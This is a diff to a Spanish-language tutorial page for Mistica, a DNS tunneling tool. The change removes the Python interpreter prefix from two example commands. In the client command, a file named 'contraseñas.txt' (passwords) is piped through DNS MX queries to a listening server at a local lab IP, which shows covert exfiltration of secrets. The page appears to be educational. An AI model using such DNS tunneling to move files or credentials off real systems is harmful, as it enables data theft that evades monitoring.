@@ -247,7 +247,7 @@ En el siguiente ejemplo, vamos a transferir ficheros desde el cliente al servido
 
 **Servidor**
 
-`python3.8 ms.py -m io:dns -s "--hostname 0.0.0.0 --port 53" -w "--queries MX" -k key `
+`ms.py -m io:dns -s "--hostname 0.0.0.0 --port 53" -w "--queries MX" -k key `
 
 
 ![image115.png]({{site.baseurl}}/images/Mistica/image115.png)
@@ -255,7 +255,7 @@ En el siguiente ejemplo, vamos a transferir ficheros desde el cliente al servido
 **Cliente**
 
 Desde CMD:
-`python.exe mc.py -m io:dns -w "--hostname 192.168.1.142 --port 53 --query MX" -k key < C:\Users\Sergio\Downloads\Mistica-master\contraseñas.txt`
+`mc.py -m io:dns -w "--hostname 192.168.1.142 --port 53 --query MX" -k key < C:\Users\Sergio\Downloads\Mistica-master\contraseñas.txt`
 
 
 ![image116.png]({{site.baseurl}}/images/Mistica/image116.png)
